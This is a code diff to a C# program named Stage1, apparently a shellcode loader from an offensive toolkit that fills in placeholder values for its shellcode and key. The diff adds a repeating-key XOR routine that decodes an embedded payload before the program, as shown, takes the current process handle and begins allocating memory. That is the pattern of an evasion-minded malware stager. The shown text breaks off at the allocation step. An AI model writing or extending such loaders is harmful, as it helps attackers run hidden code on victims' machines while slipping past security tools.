@@ -2,16 +2,41 @@ using System;
 using System.Runtime.InteropServices;
 using System.ComponentModel;
 using System.Diagnostics;
+using System.Text;
+using System.Text.RegularExpressions;
 
 namespace Stage1
 {
     class Program
     {
+        public static string ExpandString(string str, int length)
+        {
+            var result = new StringBuilder(length, length);
+            var whole = length / str.Length;
+            for (var i = 0; i < whole; i++)
+            {
+                result.Append(str);
+            }
+            result.Append(str, 0, length % str.Length);
+            return result.ToString();
+        }
+        public static byte[] exclusiveOR(byte[] key, byte[] str)
+        {
+            for (int i = 0; i < str.Length; i++)
+            {
+                str[i] = (byte)(str[i] ^ key[i]);
+            }
+            return str;
+        }
+
         static void Main()
         {
-            byte[] payload = new byte[] { [SHAPESHIFTER_SHELLCODE] };
+            string key = "[SHAPESHIFTER_KEY]";
+            byte[] encodedPayload = new byte[] { [SHAPESHIFTER_SHELLCODE] };
+            string expandedKey = ExpandString(key, encodedPayload.Length);
+            byte[] payload = exclusiveOR(Encoding.UTF8.GetBytes(expandedKey), encodedPayload);
 
-            IntPtr hCurrentProcess = PInvokes.GetCurrentProcess();
+        IntPtr hCurrentProcess = PInvokes.GetCurrentProcess();
 
 
             Console.WriteLine("[>] Allocating memory...");
